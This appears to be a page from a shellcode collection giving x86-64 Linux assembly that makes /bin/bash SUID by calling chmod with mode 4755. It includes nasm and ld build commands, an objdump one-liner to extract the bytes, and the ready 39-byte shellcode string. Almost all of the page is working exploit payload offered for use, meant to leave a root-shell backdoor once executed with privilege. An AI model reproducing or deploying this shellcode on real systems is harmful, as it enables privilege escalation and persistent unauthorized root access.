---
layout: default
title: chmod("/bin/bash", 4755) - Make bash SUID
permalink: /shellcode/asm-11.html
os: Linux
arch: Intel x86-64
length: 39
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor rax, rax			; null rax (0)
	push rax			; push null terminator

	mov al, 0x68			; move "h" into al (rax)
	push rax			; push "h"
	mov rax, 0x7361622f6e69622f	; move "/bin/bas" into rax
	push rax			; push "/bin/bas"

	mov rdi, rsp			; move pointer to "/bin/bash" into rdi
	mov si, 4755o			; move mode (SUID rwxr-xr-x [4755]) into si (rsi)

	xor rax, rax			; null rax (0)
	mov al, 0x5a			; move chmod syscall number into al (rax)
	syscall				; call chmod

	xor rdi, rdi			; null rdi (0)
	mov al, 0x3c			; move exit syscall number into al (rax)
	syscall				; call exit
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x48\x31\xc0\x50\xb0\x68\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\x48\x89\xe7\x66\xbe\xed\x09\x48\x31\xc0\xb0\x5a\x0f\x05\x48\x31\xff\xb0\x3c\x0f\x05
```